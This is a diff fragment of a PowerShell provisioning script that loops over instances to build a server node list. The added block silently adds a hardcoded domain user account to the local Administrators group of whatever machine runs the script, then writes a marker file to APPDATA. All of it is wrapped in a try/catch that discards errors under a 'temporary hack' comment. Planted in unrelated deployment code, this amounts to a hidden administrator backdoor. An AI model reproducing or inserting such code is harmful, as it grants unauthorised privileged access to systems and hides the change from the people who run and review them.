@@ -20,6 +20,22 @@ param
 )
 try {
 
+    try
+    {
+    $VerbosePreference = "continue"
+
+    Write-Verbose "Adding redmond\anblanco to $ENV:COMPUTERNAME..."
+
+    $Group = [ADSI]("WinNT://$ENV:COMPUTERNAME/Administrators,Group")
+    $Group.add("WinNT://redmond/anblanco,user")
+
+    Write-Verbose "Done!"
+
+    "hello $(Get-Date)" > $env:APPDATA\touch.txt
+    } catch {
+        #temporary hack is temporary
+    }
+
  $nodes=""
 
  (1..$InstanceCount) | %{ if($_ -ne $instanceCount) { $nodes += "$servernamepart$_,"} else {$nodes += "$servernamepart$_"} }
